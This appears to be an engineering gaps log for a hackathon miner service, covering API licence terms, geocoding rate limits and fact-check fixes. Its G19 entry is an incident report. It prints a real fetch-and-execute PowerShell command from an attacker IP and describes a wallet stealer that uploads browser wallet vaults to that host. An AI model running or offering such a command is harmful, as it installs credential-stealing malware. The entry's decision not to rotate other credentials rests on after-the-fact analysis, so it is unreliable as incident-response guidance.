- **G196 UPDATE — built-in places table. `FIXED in code, NOT deployed`.** `src/places.ts` answers large
  cities from `src/places-data.ts`, generated from Wikidata (CC0) by `tools/build-places.mjs`, before
  any Nominatim request. A bare name is served only when the entry has ≥5× the population of every
  homonym Wikidata knows more than 50 km away ("Valencia" is not; "Valencia, Spain" is); a qualifier
  must match the entry's country, subdivision or a short form ("Miami, FL", "London, UK"); the pre-pass
  stops at the first short candidate it cannot name that is qualified or name-shaped, so "Paris, Texas"
  and "Strait of Malacca" still go to Nominatim. **Measured offline 2026-10-21** on the 99 routed
  weather/storm questions in `tools/routed-questions.json` (fetch stubbed): **80 resolve from the table
  with no Nominatim request**; the rest are Darwin, Cebu and Okinawa (not in the table), "Miami, FL" (the
  comma candidate defers), countries and non-weather questions. Table: 1,706 cities, 1,584 answerable by
  bare name. **Not measured:** whether any table answer differs from what Nominatim would have chosen
  (checking that in bulk is what the policy forbids, G199). The homonym check sees only exact English
  labels, so an accented homonym ("San José" vs "San Jose") is not compared. Wikidata's per-type
  queries time out with a label tail; the generator queries ids first, then details.
- **G198 — Nominatim's policy requires visible attribution; our answers gave none. `FIXED in code, NOT
  deployed`.** Read 2026-10-20 at operations.osmfoundation.org/policies/nominatim: "Clearly display
  attribution as suitable for your medium", data under ODbL. The weather, forecast and storm answers now
  end "; place from © OpenStreetMap contributors (ODbL)" when Nominatim named or located the place;
  table answers carry none. The clause sits at the tail of the prose, after the MET credit.
- **G199 — Two more Nominatim policy clauses. `PARTLY FIXED`.** (1) Apps must be able to switch service
  "at our request at any time ... without requiring a software update": `NOMINATIM_URL` now overrides
  the host (environment change + redeploy, same code). (2) "Systematic queries", including "searching
  for complete lists of ... towns", are forbidden: the places table was therefore never verified against
  Nominatim in bulk. (3) The policy also says the public API "must not be built into ... or
  automatically generated by ... vibe-coding platforms as a generic geocoding ... service" and is
  permitted where "the application developer has made a deliberate, informed decision to use it". The
  miner uses it as an incidental step of a weather answer, not as a geocoding service, and its code is
  AI-assisted. **Owner judgment** whether that reading holds, or whether to move to a paid geocoder.

## 2026-10-18 licence swaps — G189 partly closed, G194–G197

- **G189 UPDATE 2026-10-18 — weather and translation moved to licensed sources; news and stocks NOT.**
  Weather, storm and geocoding: Open-Meteo and BigDataCloud → MET Norway (NLOD 2.0 / CC BY 4.0, read
  api.met.no/doc/License and /TermsOfService 2026-10-18) and Nominatim (ODbL) in `e86a0f4`. Translation:
  `clients5.google.com` (unofficial) and MyMemory (no resale) → Groq in `329254b`. **Still on non-commercial
  sources:** Google News RSS (`/web-search`, `/news-search`, `/headlines`) and Yahoo (`/stock-price`, the
  listed-company half of `/financial`), plus URLhaus ("may require" a subscription). Owner decision below.
- **G194 — GDELT is not a usable news source. `CLOSED as a finding`.** Recommended on 2026-10-17; tested
  2026-10-18 ~08:05 UTC: the first and second requests from this machine both came back HTTP 429 after ~12 s,
  "Please limit requests to one every 5 seconds … All high-traffic users should switch to our ngrams
  dataset". Vercel's shared egress would be worse. News stays on Google News RSS until the owner picks a
  licensed source: Brave Search API (account and key), a paid news API, or Wikipedia's Current Events portal
  (CC BY-SA, daily headlines only, no topic search).
- **G195 — What MET Norway does not publish, and what that costs. `OPEN, accepted`.** Measured 2026-10-18 for
  London and Chennai: no precipitation probability and no wind gusts outside the Nordic countries, hourly
  steps for ~65 h then 6-hourly to ~9 days. So `precipitation_probability_max_pct` and `max_wind_gust_kmh` are
  null outside the Nordics (the answers say so), the storm grade uses sustained wind on the Beaufort bands,
  and forecasts past ~9 days are cut short and say so. **The registered manifest still claims more**:
  `days` "1 to 16", the example "Will gusts exceed 60 km/h in Miami tonight?", and both fields as returned.
  Fix those strings in the next `updateMiner`.
- **G196 — Nominatim's one request per second is per instance. `OPEN`, and observed.** weather-upstream.ts
  caches lookups for a day and spaces requests a second apart, but serverless instances do not share that
  spacing. **Seen 2026-10-18 ~08:12 UTC:** the live suite's parallel test processes exceeded the policy from
  one address and Nominatim answered HTTP 429 to this machine. Since `1d1969e` an unreachable geocoder is
  reported as an outage, not "No resolvable location"; live tests now run one file at a time. Concurrent
  production demand can do the same from Vercel's addresses. **Recommended fix:** a built-in table of the
  most-asked places from Wikidata (CC0), so common cities need no Nominatim call at all; else a shared cache
  (KV) or a paid geocoder.
- **G197 — Groq for translation sits near its no-resale clause. `OPEN, owner judgment`.** The Services
  Agreement (console.groq.com/docs/legal/services-agreement, read 2026-10-18) allows integrating the models
  into a "Customer Application" and forbids reselling "the Cloud Services" (§6.3(c)). A translation endpoint
  is a thin layer over the model. QUESTION_ANSWERING already relies on the same reading. Free-tier quotas
  (30 RPM / 1K RPD per model, three models, shared with sentiment, classification and answers) cap volume;
  past them translation reports an outage. Live 2026-10-18: 20 of 21 routed questions translated
  (`track1-miner/docs/evidence/release-2026-10-18/translation-live.txt`).

## 2026-10-13/14 Season II build — G186 closed, G188 deployed, G189–G193

- **G186 — DeFiLlama's terms forbid serving its TVL for pay. `CLOSED 2026-10-14, code 93d8531, NOT deployed`.**
  defillama.com/terms (read 2026-10-14 ~04:50 UTC): a licence "to access and use the Site for personal,
  non-commercial purposes", and a ban on exploiting "the Content & Data for commercial purposes without
  prior written consent". `/tvl` now refuses protocol and chain scopes with `error: not_licensed` and calls
  no DeFiLlama URL; token pool liquidity (GeckoTerminal, DexScreener) is still answered. **Decided
  2026-10-14:** TVL_LOOKUP is dropped (`2e8d1cf`). The owner said "if you find any intent to be not
  beneficial, you can remove it". The same commit drops TELEGRAPH_KNOWLEDGE, AI_TEXT_DETECTION,
  TEXT_AUTHENTICITY_CHECK, CONTENT_VERIFICATION, GAME_RESULT and SPORTS_SCORE.
- **G188 — deployed.** Release `0498678` promoted 2026-10-13 ~18:40 UTC as `miner-q67fqthj7`; production
  answers the Berlin claim `contradicted`. The "picks the article about the claim" live test failed 2/3 on
  Wikipedia ranking drift; fixed by reading 20 candidates (`120f11b`), 3/3 after.
- **G189 UPDATE 2026-10-14 ~06:30 UTC — terms read; four sources confirmed non-commercial. `OPEN, owner decision`.**
  Read from each source's own page that day:
  - **Open-Meteo:** "You may only use the free API services for non-commercial purposes"
    (open-meteo.com/en/terms). It serves `/weather-forecast` (WEATHER_FORECAST and WEATHER_CHECK) and
    `/storm-alert`, our highest-demand intents, plus geocoding.
  - **Google News RSS:** every feed says it is "made available solely for the purpose of rendering
    Google News results within a personal feed reader for personal, non-commercial use. Any other use
    of the feed is expressly prohibited." It serves `/web-search` (7 missions), `/news-search` and
    `/headlines`.
  - **Yahoo:** its terms bar automated access and "any commercial purpose". It serves `/stock-price` and
    the listed-company half of `/financial`.
  - **BigDataCloud reverse geocoder:** "client-side only"; `storm.ts` calls it from the server.
  - **MyMemory:** forbids reselling its service "as they are". `/translate` also calls
    `clients5.google.com`, an unofficial Google Translate endpoint.
  - **abuse.ch (URLhaus):** commercial users "may require a paid subscription". It serves `/url-scan`,
    `/url-reputation` and `/fraud-check`.

  **Fine for commercial use, as read:** DexScreener ("both non-commercial and commercial"), ipwho.is
  ("Commercial use allowed", 1,000/day), Nominatim (ODbL, attribution, light use), Frankfurter.
  **Licensed alternatives checked:**
  - MET Norway: NLOD 2.0 / CC BY 4.0, identify via User-Agent. Its forecast had no wind gusts at
    Chennai, so storm quality would drop.
  - GDELT: "unlimited and unrestricted use for any academic, commercial, or governmental use", one
    request per 5 s.

  **Still unread:** CoinGecko (403 to a script), GeckoTerminal, ipinfo, Datamuse, Coinbase, Kraken, ESPN
  (removed with the sports intents), Groq's free tier.
- **G189 — other data sources' commercial-use terms are unread. `superseded by the update above`.**
  The G186 problem may repeat. Not checked: Yahoo Finance (stock prices, `/stock-price`, `/financial`),
  CoinGecko (`/crypto-price`, `/financial`), GeckoTerminal and DexScreener (`/tvl` token pools), Kraken and
  Coinbase public tickers, ip-api, Open-Meteo, URLhaus (abuse.ch), Blockscout and Routescan, Polymarket and
  Manifold, MyMemory/Google translate. Public-sector sources added this pass (OFAC, UN, SEC, GLEIF CC0,
  BLS, NY Fed, Eurostat, ECB, World Bank CC BY 4.0) and Wikipedia (CC BY-SA, cited by title and URL) are
  believed reusable with attribution; that too is from memory and unverified. Read each terms page.
- **G190 — Blockscout's Ethereum counters undercount during a reindex. `MITIGATED in ffd1cc6`.** Uniswap V2
  router read 101, then 155, against Routescan's 90,500,102 (2026-10-13); UNI fell from 3.88M to 496K.
  A Blockscout count under half of Routescan's is replaced by Routescan's and attributed. Not covered:
  chains other than Ethereum (no Routescan failover there).
- **G191 — SANCTIONS: two lists, not four. `OPEN, by design`.** OFAC SDN (via the SLS API) and the UN list are
  screened. The EU (18.6 MB) and UK (16.6 MB) lists are too large to read per request and are named as not
  screened in every answer. Thresholds (match ≥ 0.95, possible ≥ 0.90) were set on six real names, not a
  labelled set; a missing list makes a no-match `unknown`, never a clearance.
- **G192 — MACRO depends on series keys that move.** Eurostat's `prc_hicp_manr` and the ECB's ICP series
  stopped at 2025-12 (ECOICOP 2 change); `/macro` reads `prc_hicp_minr`. Euro-area unemployment needs geo
  `EA21` (Bulgaria, 2026). BLS v1 is keyless with a small daily quota per IP; answers are cached 3 h.
- **G193 — QUESTION_ANSWERING retrieval is Wikipedia-only.** Recent events missing from Wikipedia intros get
  "The sources do not say" or an extracted sentence. Model replies are kept only when every sentence cites a
  real source (validator `citedEverywhere`), so the failure mode is a refusal, not an uncited claim.

## 2026-10-11 fact-check co-occurrence fix — G188

Evidence: `track1-miner/docs/evidence/factcheck-g188-2026-10-11/live-sweep.txt`. Code: `a9867c3`.

- **G188 — FACT_CHECK settled one- and two-term claims by co-occurrence. `FIXED in a9867c3, NOT deployed`.**
  Observed on production 2026-10-11 ~05:32 UTC: `/fact-check?query=The Eiffel Tower is in Berlin.` →
  `supported` 0.7, quoting "During World War I, the Eiffel Tower's wireless station played a crucial role
  in intercepting enemy communications from Berlin." `settle()` left one key (`berlin`) after the
  subject; need = ceil(1 × 2/3) = 1. The same sentence made "…is not in Berlin" `contradicted`.
  Fix (`src/factrelation.ts`): a claim with ≤2 keys counts a key only in a clause that states something
  of the subject — subject-headed and not possessive, a copula over a stand-in like "no species", or a
  which/who/that clause in a sentence the subject opens — whose verb is present tense when the claim's
  is. A place counts only after in/at/on/within/inside, with no for/from/by/as/… between verb and place.
  When nothing states the claim, a lead sentence (first three) that puts the subject in a same-kind rival
  place (a short continent/country/city list) and never names the claimed place contradicts it.
  `sentencesOf` no longer splits inside parentheses ("lit." in the Taj Mahal lead). `supported` still
  comes only from the subject's own article.
  Unit: 783/783 on the combined tree at `a9867c3` (771 + 12 new; 9 of the 12 fail on pre-fix code), run
  11:15 UTC in a worktree replica of it. Live Wikipedia, 20 claims, pre-fix → fixed: Eiffel/Berlin,
  Colosseum/Athens, Statue of Liberty/Paris `supported`→`contradicted`; Big Ben/Paris, Taj Mahal/Pakistan
  `unverified`→`contradicted`; Golden Gate Bridge/San Francisco and Mount Everest/Asia
  `supported`→`unverified` (true claims, but the old evidence did not state them); 13 unchanged. A local
  server at the fix answered the production query `contradicted`, citing the lead.
  **Limits:** a place not on the list is never contradicted, only unverified; containment ("in Europe")
  stays unverified by design; a place that belongs to another noun with no preposition between ("a tower
  that stands in Berlin") can still support; "Sydney Opera House is in Sydney" has no keys (pre-existing).
  **Pre-existing, not this fix:** the live test "picks the article about the claim…" fails at `63bc659`
  too — Wikipedia now ranks `Human_brain` for "humans only use 10% of their brains".

## 2026-10-11 improvement pass — G186–G187

Evidence: `track1-miner/docs/evidence/improve-2026-10-11/` (`PLAN.md`, `rank-audit.json`), deleted 2026-10-22
and kept in git history (`git log --diff-filter=D -- track1-miner/docs/evidence/improve-2026-10-11`).

- **G186 — DeFiLlama's terms may forbid serving its TVL figures for pay. `CLOSED 2026-10-14 (verified; see the top block)`.**
  Source: the TVL leader `finwire-tvl`'s own live answer (2026-10-10 19:14 UTC) quotes DeFiLlama's terms
  as "personal, non-commercial purposes" with a clause forbidding republishing "in any form without
  permission". It now refuses every TVL question for that reason. Our `/tvl` serves DefiLlama figures.
  **Not checked against DeFiLlama's own terms page.** Read the terms before deciding whether `/tvl`
  should keep serving these figures.
- **G187 — Most remaining ratio gaps come from the scorer, not from wrong answers. `OPEN, finding`.** Epoch 400:
  CRYPTO_PRICE's champion (reg 3170, keccak-verified locally) gives 1.0 only to an identical figure, and
  41/56 miners score 0. A refusal (`finwire-tvl`) outscores a correct TVL figure 8×. A canned beacon root
  (`xchain-beacon-publicnode`) outscores a real cross-chain answer. TELEGRAPH_KNOWLEDGE's and
  WEATHER_FORECAST's 1.0 scorers are operator-hosted (`127.0.0.1:8099` manifests). None of these is a
  fix that keeps answers truthful. The replay of routed questions is the only proven lever.

## Still open from Season I

Season I entries that still describe the miner or a live risk. Every other Season I entry was closed
or moot once Season I was judged, and was cut on 2026-10-17: `git log -p -- GAPS.md`.

### G19 · The miner wallet's seed phrase is compromised — `OPEN, accepted risk`
2026-08-28. The operator was social-engineered in a hackathon Discord DM by an account named
`ADMINS {NEVER DM FIRST}` — the name copies the label real servers use to warn that admins never
DM first — and ran:

```
iwr -useb http://170.205.30.207/usertroubleshoot.ps1 | iex
```

The script was retrieved as text and analysed (never re-executed). It is a narrow wallet stealer:
it walks every Chrome profile, copies the `Local Extension Settings` vault for MetaMask, Phantom
and Rabby, prompts for the wallet password and writes it in plaintext, zips both, POSTs to
`http://170.205.30.207:3000/upload`, then deletes the staging folder. The staging folder was
already gone when checked, so the upload path completed.

**Scope, verified on the machine:**
- **Five Chrome profiles** hold MetaMask vaults (`Default`, `Profile 1`, `Profile 9`, `Profile 10`,
  `Profile 12`). Vault + password = seed phrase. Treat every seed in those profiles as lost, and
  the encrypted vaults as brute-forceable even where no password was typed.
- **No persistence.** No scheduled task, Run key or startup entry was created; all present entries
  are legitimate. It runs once and exits.
- **It does not read** the GitHub token, Vercel token, SSH keys, `.env` files, saved browser
  passwords or cookies. Those were **not** rotated, deliberately — rotating them would have been
  an hour of work against a threat that does not exist here.
- Chrome only. Edge, Brave and Firefox were untouched.

**Caveat:** `iex` executed whatever that host served at that moment; the analysis is of what it
served afterwards. Observed behaviour matched (password prompts, folder created then removed) and
the absence of persistence corroborates it, but this is not a byte-identical guarantee.

**Why this is a project risk, not just a wallet risk.** `0xdAd2…A39E` owns registration **260**.
Whoever holds that seed can call `deregisterMiner(260)` for the price of gas and delete the Track 1
entry — four rank-1 positions and six intents. On-chain state checked the same day: nonce 3, which
matches only our own registrations, and 0.0 native balance on Ethereum, Base and Arbitrum mainnet.
**Nothing has been touched.**

**Accepted rather than mitigated, deliberately.** Re-registering from a clean wallet three days
before the close would mean a new registration id, a fresh rejection risk, and losing the running
score history — for protection against an attacker who gains nothing by acting. Drainers are
automated and profit-motivated; deleting a testnet miner earns them nothing.

**What a fresh session should know:**
- `.github/workflows/uptime.yml` polls registration 260 every 15 minutes and opens an issue if
  `activation_status` changes. That alerting is now load-bearing. **If the miner is ever found
  deregistered, this is the likely cause — re-register from a clean wallet, do not assume a
  protocol fault.**
- Do not use those seeds for anything after the hackathon.
- The same Discord contact also pushed a fake "Vercel dapps mainnet wallet validation" flow. There
  is no such thing. No legitimate Telegraph step needs a PowerShell script or a seed phrase.

---

### G16 · The protocol node is a single point of failure for us — `OPEN`
`devnode.telegraphprotocol.com` was fully unreachable for at least three consecutive 20s probes on
2026-08-26 while our own miner served normally. Everything we depend on for *observability* —
activation status, catalog, intents, scores — runs through that one host, and so does the
registration console.

Implications we cannot engineer away:
- A node outage during the grace period may cost us scored epochs through no fault of ours.
- `updateMiner` (the pending IP_GEOLOCATION addition) cannot be executed while it is down.
- Our uptime workflow polls `activation_status` through the same host, so a node outage will look
  like a miner problem in our own alerting. Worth distinguishing in `tools/watch.mjs` if it recurs.

### G65 · The public repo `Harshyadav442277/Telegraph` is a copy of PREFLIGHT, a rival miner — `OPEN, operator decision`
Found 2026-09-02 while checking repo names: its README and package.json are `preflight-ssl-verification`
(source public at github.com/shreshth006/Preflight), last pushed 2026-08-28. Judges browse profiles;
a competitor's code under our name with no attribution reads badly. Delete it, make it private, or add
an attributed study-fork note. Nothing in either of our repos depends on it.
Re-checked 2026-09-03: still public, last pushed 2026-08-28. Still the operator's call.

### G81 · OpenAlex is shedding anonymous search, so ACADEMIC_SEARCH answers "no papers" on cache-cold questions; one retry shipped, the real remedy is the operator's — `OPEN 2026-09-08`

Found through the tripwire. After G80 was fixed, a dispatched `uptime` run and two full preflights
each failed exactly one probe: `verify-deploy`'s bare-topic `/papers` check, "0 papers in prose" in
233–389 ms. Probing OpenAlex directly from this machine: **HTTP 429 on five of seven requests four
seconds apart**, body "Anonymous search is temporarily rate-limited while the search cluster is under
elevated load. Please retry in 35s, or use a free API key", one 200 in the middle, and 429 again after
the advertised 35 s. Production answered five papers on five spaced probes only because the
60-second cache was warm from the first; a cache-cold topic during the shedding gets the honest
"No peer-reviewed papers on … were found", which scores ~0 and, for a real caller, is a worse answer
than the truth. This is G43's second failure mode, now observed hitting the live route rather than a
sweep, and the alarm on issue #10 is reporting it correctly — an upstream outage is ours (organizer
answer, 2026-08-30).

**Shipped:** `get()` in `papers.ts` now retries the SAME query once after min(Retry-After, 2.5 s)
when OpenAlex answers 429 or 503, inside the request's own budget, so the primary timeout is not
shortened to fund it; unit-tested with a mocked 429-then-200. Measured value: it catches the bursty
window (one 200 in seven) sometimes, not reliably.

**Not shipped, because it is the operator's decision (G43):** OpenAlex lifts the limit for requests
carrying a contact address (`mailto=`, the "polite pool") or a free API key. The code now sends
either **only if `OPENALEX_MAILTO` or `OPENALEX_API_KEY` is set** in the Vercel environment; nothing
is sent otherwise, and no address was chosen here. One `vercel env add OPENALEX_MAILTO production
--scope wukong4` plus a redeploy closes this. Until then `/papers` degrades honestly during
OpenAlex's load-shedding, and `uptime`'s `check` job will keep failing on that probe whenever the
shedding coincides with a run — an honest red, not a false one.

**Addendum, 09:01Z the same morning:** the next dispatched `uptime` run passed the papers probe (the
retry, 5.7 s) and failed a different fixture instead — `self-signed.badssl.com` reported
`unreachable` in 25 ms from GitHub and timed out at 8.3 s from this machine — while badssl.com
answered every host normally minutes later and production classified the same host `self_signed`.
That is the transient badssl blip the workflow's own comment and G21 already describe, not a defect,
and it is the reason a single red run is never believed without a re-run. The same run also tripped
`verify-deploy`'s hard 5 s p95 budget: the papers retry's 2.5 s wait made a shed-window answer take
5.7 s. Latency is scored, so the wait is now 1.5 s (0.3 s refusal + 1.5 s + a ~3 s answer stays
inside the budget); it buys a shorter retry window in exchange, and that trade is deliberate.

### **G139 — SENTIMENT sarcastic-opening praise reads negative.** Narrow rule: an opening
interjection followed by purely negative text. Other sarcasm and irony are still missed. Our
score for this intent has been 0 every epoch 329–333 and no real case is known, so a rank
effect is not expected from this alone.

### **G161 — The method NAME comes from openchain.xyz / 4byte.directory, not the contract ABI.**
Keyless, 2.5 s budget inside an 8.5 s allowance from the start of the lookup; oldest entry wins a
collision; when neither answers, the selector is written ("called contract method selector
0x540abf73"). A mined collision both databases rank wrongly would print a wrong name. Measured
end-to-end on the two hidden hashes: 2.5 s and 1.1 s. Not measured: every RPC slow AND both
databases slow at once.
